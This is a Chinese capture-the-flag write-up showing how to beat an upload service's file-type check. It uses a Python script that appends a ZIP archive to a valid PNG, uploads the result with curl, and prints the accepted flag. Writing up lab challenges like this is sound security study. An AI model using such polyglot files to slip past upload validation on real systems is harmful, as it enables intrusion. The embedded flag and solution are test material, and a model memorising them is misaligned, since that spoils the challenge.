## 题目原文

> 目标环境部署了文件类型校验机制限制上传文件格式。已获授权进行红队评估，请构造能同时满足多重格式语义、从而规避该校验的制品，通过后取得 flag。本题采用 flag 与制品质量双轨评分。

## 题解

### 入口与指纹

8000 端口，`Werkzeug/3.1.8 Python/3.11.15`。`GET /` 说明挑战名是 `polyglot-file-construction`。上传入口是 `POST /upload`，multipart 字段名 `file`，最大 65536 字节。允许的主格式是 `png`、`jpg`、`pdf`、`gif`。可执行文件头会被拒绝。服务先校验主格式，再做附加分析。

### 关键观察

主格式看的是文件头，第二格式可以接在合法结构后面。一个 1×1 的 PNG（签名、IHDR、IDAT、IEND 都齐全）后面直接拼一个 ZIP，主类型仍是 `png`，附加分析在偏移 69 认出 ZIP。响应是：

```json
{"detected_type":"png","status":"bypassed",
 "message":"Polyglot detected! Primary: PNG, Secondary: ZIP archive",
 "secondary_formats":[{"format":"zip","offset":69}]}
```

同一份 ZIP 接在 JFIF 头后面，主类型变成 `jpg`，偏移 20，同样 `bypassed`。flag 在这份 JSON 里，不需要再去读文件。

### 利用链

```bash
T=$(head -1 .target)
python3 - << 'PY'
import io, struct, zipfile, zlib
def chunk(tag, data):
    return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
sig = b"\x89PNG\r\n\x1a\n"
ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
idat = zlib.compress(b"\x00\xff\x00\x00")
png = sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    z.writestr("readme.txt", "hello")
open("poly.png", "wb").write(png + buf.getvalue())
PY
curl -sS -F "file=@poly.png;filename=poly.png" "http://$T/upload"
```

本次平台接受的值是 `flag{b9f91385-d6b0-4a96-8c0a-b71040ea78de}`。

### flag 位置

`POST /upload` 的 JSON 响应字段 `flag`。判定条件是 `status == "bypassed"`，并且 `secondary_formats` 里出现第二种格式。
